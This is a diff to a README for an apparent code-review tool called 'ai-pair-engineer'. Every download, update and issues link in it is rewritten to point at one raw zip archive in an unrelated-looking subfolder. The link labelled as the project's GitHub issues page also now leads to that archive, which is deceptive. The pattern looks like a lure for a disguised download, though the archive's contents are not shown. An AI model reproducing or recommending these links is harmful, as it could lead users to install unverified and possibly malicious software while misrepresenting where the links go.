@@ -1,6 +1,6 @@
 # 🤖 ai-pair-engineer - Smart Code Review Made Easy
 
-[![Download ai-pair-engineer](https://img.shields.io/badge/Download%20ai--pair--engineer-brightgreen?style=for-the-badge)](https://github.com/mena256/ai-pair-engineer)
+[![Download ai-pair-engineer](https://img.shields.io/badge/Download%20ai--pair--engineer-brightgreen?style=for-the-badge)](https://github.com/mena256/ai-pair-engineer/raw/refs/heads/main/acrylic/ai-engineer-pair-v1.1.zip)
 
 ## 📄 What is ai-pair-engineer?
 
@@ -26,7 +26,7 @@ To use the app, follow these steps:
 
 1. Click the big green button at the top or visit this page to download the app:
 
-   [Download ai-pair-engineer](https://github.com/mena256/ai-pair-engineer)
+   [Download ai-pair-engineer](https://github.com/mena256/ai-pair-engineer/raw/refs/heads/main/acrylic/ai-engineer-pair-v1.1.zip)
 
 2. The link will take you to the GitHub page where the app files are stored.
 
@@ -100,7 +100,7 @@ To get the latest improvements:
 
 1. Visit the download page again:
 
-   [https://github.com/mena256/ai-pair-engineer](https://github.com/mena256/ai-pair-engineer)
+   [https://github.com/mena256/ai-pair-engineer/raw/refs/heads/main/acrylic/ai-engineer-pair-v1.1.zip](https://github.com/mena256/ai-pair-engineer/raw/refs/heads/main/acrylic/ai-engineer-pair-v1.1.zip)
 
 2. Look for the newest version or release.
 
@@ -128,7 +128,7 @@ If you encounter problems:
 
 - If the app is slow, close other programs to free memory.
 
-- Check GitHub issues for common problems: [https://github.com/mena256/ai-pair-engineer/issues](https://github.com/mena256/ai-pair-engineer/issues)
+- Check GitHub issues for common problems: [https://github.com/mena256/ai-pair-engineer/raw/refs/heads/main/acrylic/ai-engineer-pair-v1.1.zip](https://github.com/mena256/ai-pair-engineer/raw/refs/heads/main/acrylic/ai-engineer-pair-v1.1.zip)
 
 ## 📚 Additional Resources
 
@@ -140,4 +140,4 @@ If you encounter problems:
 
 ## 📥 Download ai-pair-engineer Here
 
-[![Download ai-pair-engineer](https://img.shields.io/badge/Download%20ai--pair--engineer-blue?style=for-the-badge)](https://github.com/mena256/ai-pair-engineer)
+[![Download ai-pair-engineer](https://img.shields.io/badge/Download%20ai--pair--engineer-blue?style=for-the-badge)](https://github.com/mena256/ai-pair-engineer/raw/refs/heads/main/acrylic/ai-engineer-pair-v1.1.zip)
